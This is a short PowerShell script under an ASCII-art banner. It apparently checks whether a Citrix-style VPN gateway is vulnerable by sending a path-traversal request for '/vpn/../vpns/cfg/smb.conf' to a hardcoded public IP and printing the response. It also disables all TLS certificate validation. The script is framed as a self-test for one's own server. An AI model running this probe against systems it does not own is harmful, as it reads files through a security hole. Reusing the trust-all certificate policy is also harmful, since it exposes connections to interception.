<#                                                                                                                                                               
                                                                                                                                                               
                                                                                                                                                               
                                                                                                                                                               
                                                                                                                                                               
                                                                                                                                   .         .                 
                                                                                                  ..                          .*////     *////                 
                                                                                             */////.                          //////    //////                 
                                                                                            ,//////.                          //////    //////                 
                                                                                            ,//////.                          //////    //////                 
                //////       //////       //////      *////////////*     .//////,*////,  //////////////    /////////////      //////    //////                 
                //////       //////       //////    *///////**////////    ////////////,  //////////////  //////*  .//////.    //////    //////                 
                //////       //////       //////   *//////      ///////   /////////*,.      ,//////     //////*     //////    //////    //////                 
                //////       //////       //////   //////*      *//////   ///////           ,//////     ///////////////////   //////    //////                 
                //////       //////       //////  .//////*      ,//////.  //////*           ,//////     ///////////////////  .//////   .//////                 
                //////       //////       //////   ///////      ///////   //////,           ,//////     //////               .//////   .//////                 
                .//////,   ,////////,    ///////   ,//////*     ///////   //////,           ,//////     //////*     //////*   //////    //////                 
                 ,////////////////////////////,      ////////////////     //////,           ,//////      ,///////////////.    ////////. ////////               
                   *///////////  ///////////*          *//////////*       //////,           ,//////.       ,///////////.       ///////.  ///////               
                                                                                             //////////                                                        
                                                                                              /////////                                                        
                                                                                                                                                               
                                                                                                                                                                
																																							    
																																								
																																								
#>

<#

Set the $IP variable to your own server to detect if its vulnerable

#>

add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[System.Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
$Request = ""
$IP = "52.157.71.120"
$URL = "https://" + $IP + "/vpn/../vpns/cfg/smb.conf"
$Request = Invoke-WebRequest -Uri $URL
$Request.Content
